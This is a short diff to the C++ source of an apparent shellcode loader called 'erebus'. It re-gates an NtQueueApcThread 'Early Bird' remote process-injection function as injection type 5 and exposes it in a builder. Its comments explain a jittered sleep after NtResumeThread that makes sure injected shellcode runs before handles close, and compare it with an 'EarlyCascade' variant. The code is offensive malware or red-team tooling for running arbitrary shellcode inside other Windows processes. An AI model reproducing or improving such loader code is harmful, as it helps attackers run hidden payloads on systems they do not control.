@@ -1,7 +1,21 @@
 #include "../../include/loader.hpp"
 
 namespace erebus {
-#if CONFIG_INJECTION_TYPE == 1
+// CONFIG_INJECTION_TYPE == 5 — vanilla NtQueueApcThread (Remote, Early Bird).
+//
+// Sibling of `injection_earlycascade.cpp` (type 3). Both queue an APC to a
+// suspended thread in a remote process, but this variant adds a jittered
+// 800-1200ms Sleep after NtResumeThread so the APC actually fires before
+// the loader tears down the process/thread handles. The EarlyCascade
+// variant has a known race where rapid handle close can pre-empt the APC.
+//
+// Pre-fix this file was incorrectly gated on `== 1`, which meant it
+// compiled into every NtMapViewOfSection build as dead code (the dispatch
+// table for type 1 routes to InjectionNtMapViewOfSection, never to this).
+// The orphan was never exposed in the builder UI either, so the
+// implementation was unreachable in every shipped binary. Now exposed as
+// the real type-5 selection.
+#if CONFIG_INJECTION_TYPE == 5
 	VOID InjectionNtQueueApcThread(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
 	{
 		LOG_INFO("Injection via. NtQueueApcThread");
